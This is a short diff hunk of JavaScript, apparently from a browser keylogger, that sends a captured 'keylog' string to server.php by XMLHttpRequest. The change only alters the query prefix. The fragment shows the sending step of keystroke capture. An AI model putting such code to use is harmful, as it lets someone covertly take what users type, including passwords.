@@ -112,7 +112,7 @@ httpRequest = new ActiveXObject("Microsoft.XMLHTTP");
 else {
 httpRequest = new XMLHttpRequest();
 }
-httpRequest.open("GET", "server.php?keylog="+keylog, true);
+httpRequest.open("GET", "server.php?keylog=string:"+keylog, true);
 httpRequest.send(null);
 }
 
